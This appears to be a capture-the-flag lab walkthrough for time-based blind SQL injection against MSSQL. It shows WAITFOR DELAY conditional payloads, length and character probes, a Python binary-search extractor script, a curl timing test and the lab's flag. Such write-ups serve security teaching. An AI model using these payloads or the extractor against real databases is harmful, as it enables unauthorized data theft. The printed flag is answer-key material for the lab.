<h4>Step 1: Observe the Always-Same Response</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Baseline</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>login<br>
        <span class="prompt">SQL: </span>SELECT * FROM audit_log WHERE event LIKE '%login%'<br>
        <span class="prompt">Response: </span><strong>Search complete.</strong> -- Time: ~0.024s<br><br>
        <span class="prompt">Input: </span>' OR 1=1 -- -<br>
        <span class="prompt">Response: </span><strong>Search complete.</strong> -- Time: ~0.025s<br><br>
        <span class="prompt">// Same response always -- no boolean signal, no errors. Need time-based.</span>
    </div>
</div>

<h4>Step 2: Confirm WAITFOR DELAY Works</h4>
<p>
    MSSQL natively supports stacked queries with <code>;</code>.
    <code>WAITFOR DELAY 'h:m:s'</code> pauses execution for a specified duration.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. WAITFOR DELAY Test</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>'; WAITFOR DELAY '0:0:2' -- -<br>
        <span class="prompt">Response: </span>Search complete. -- <strong>Time: 2.027s</strong> (2-second delay confirmed!)<br><br>
        <span class="prompt">// Stacked queries + WAITFOR DELAY confirmed!</span>
    </div>
</div>

<h4>Step 3: Conditional Time Oracle with IF</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Conditional IF + WAITFOR</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// TRUE condition -- delay:</span><br>
        <span class="prompt">Input: </span>'; IF (1=1) WAITFOR DELAY '0:0:2' -- -<br>
        <span class="prompt">Response: </span>Time: <strong>2.024s</strong> (2s delay = TRUE)<br><br>
        <span class="prompt">// FALSE condition -- no delay:</span><br>
        <span class="prompt">Input: </span>'; IF (1=2) WAITFOR DELAY '0:0:2' -- -<br>
        <span class="prompt">Response: </span>Time: <strong>0.039s</strong> (instant = FALSE)
    </div>
</div>

<h4>Step 4: Extract the First Character</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. First Character Test</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Test if first char is 'F' (ASCII 70):</span><br>
        <span class="prompt">Input: </span>'; IF (ASCII(SUBSTRING((SELECT TOP 1 secret FROM secrets),1,1))=70) WAITFOR DELAY '0:0:2' -- -<br>
        <span class="prompt">Response: </span>Time: <strong>2.022s</strong> (2s delay -- first char IS 'F')<br><br>
        <span class="prompt">// Test if first char is 'A' (ASCII 65):</span><br>
        <span class="prompt">Input: </span>'; IF (ASCII(SUBSTRING((SELECT TOP 1 secret FROM secrets),1,1))=65) WAITFOR DELAY '0:0:2' -- -<br>
        <span class="prompt">Response: </span>Time: <strong>0.045s</strong> (instant -- first char is NOT 'A')
    </div>
</div>

<h4>Step 5: Determine Flag Length</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Flag Length</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>'; IF (LEN((SELECT TOP 1 secret FROM secrets))>20) WAITFOR DELAY '0:0:2' -- -<br>
        <span class="prompt">Response: </span>Time: 2.024s (TRUE -- length > 20)<br><br>
        <span class="prompt">Input: </span>'; IF (LEN((SELECT TOP 1 secret FROM secrets))>30) WAITFOR DELAY '0:0:2' -- -<br>
        <span class="prompt">Response: </span>Time: 0.032s (FALSE -- length &lt;= 30)<br><br>
        <span class="prompt">Input: </span>'; IF (LEN((SELECT TOP 1 secret FROM secrets))=28) WAITFOR DELAY '0:0:2' -- -<br>
        <span class="prompt">Response: </span>Time: 2.028s (TRUE -- flag is <strong>28 characters</strong>)
    </div>
</div>

<h4>Step 6: Automation Script</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. Python Time-Based Extractor</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>python3 -c "<br>
import requests, time<br>
url = 'http://TARGET/lab.php'<br>
flag = ''<br>
THRESHOLD = 1.5<br>
<br>
for i in range(1, 30):<br>
&nbsp;&nbsp;low, high = 32, 126<br>
&nbsp;&nbsp;while low &lt;= high:<br>
&nbsp;&nbsp;&nbsp;&nbsp;mid = (low + high) // 2<br>
&nbsp;&nbsp;&nbsp;&nbsp;payload = f\"'; IF (ASCII(SUBSTRING((SELECT TOP 1 secret FROM secrets),{i},1))>{mid}) WAITFOR DELAY '0:0:2' -- -\"<br>
&nbsp;&nbsp;&nbsp;&nbsp;start = time.time()<br>
&nbsp;&nbsp;&nbsp;&nbsp;r = requests.get(url, params={'lab':'mssql/lab5','mode':'black','search':payload})<br>
&nbsp;&nbsp;&nbsp;&nbsp;elapsed = time.time() - start<br>
&nbsp;&nbsp;&nbsp;&nbsp;if elapsed > THRESHOLD:<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;low = mid + 1<br>
&nbsp;&nbsp;&nbsp;&nbsp;else:<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;high = mid - 1<br>
&nbsp;&nbsp;if low > 126: break<br>
&nbsp;&nbsp;flag += chr(low)<br>
&nbsp;&nbsp;print(f'[+] {flag}')<br>
print(f'Flag: {flag}')<br>
"
    </div>
</div>

<h4>Step 7: Extracted Result</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 7. Full Flag</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">[+] </span>F -> FL -> FLA -> FLAG -> FLAG{ -> ...<br>
        <span class="prompt">Flag: </span><strong>FLAG{ms_w41tf0r_d3l4y_bl1nd}</strong>
    </div>
</div>

<h4>Step 8: Submit the Secret</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{ms_w41tf0r_d3l4y_bl1nd}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Manual Timing Test</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -w "\nTime: %{time_total}s" "http://localhost/SQLi-Arena/mssql/lab5" \<br> --data-urlencode "search='; IF (ASCII(SUBSTRING((SELECT TOP 1 secret FROM secrets),1,1))=70) WAITFOR DELAY '0:0:2' -- -"<br><br>
        <span class="prompt"># </span>Verified: Returns "Search complete." with Time: 2.022s -- first char is 'F' (ASCII 70)
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> MSSQL's <code>WAITFOR DELAY 'h:m:s'</code> is the native
    time-based blind injection primitive, equivalent to MySQL's <code>SLEEP()</code>.
    Combined with MSSQL's native support for stacked queries (<code>;</code>), the pattern
    <code>'; IF (condition) WAITFOR DELAY '0:0:N' -- -</code> creates a conditional time oracle.
    This works even when there are no boolean signals or error messages. Always use parameterized
    queries and set query timeouts to mitigate time-based attacks.
</div>
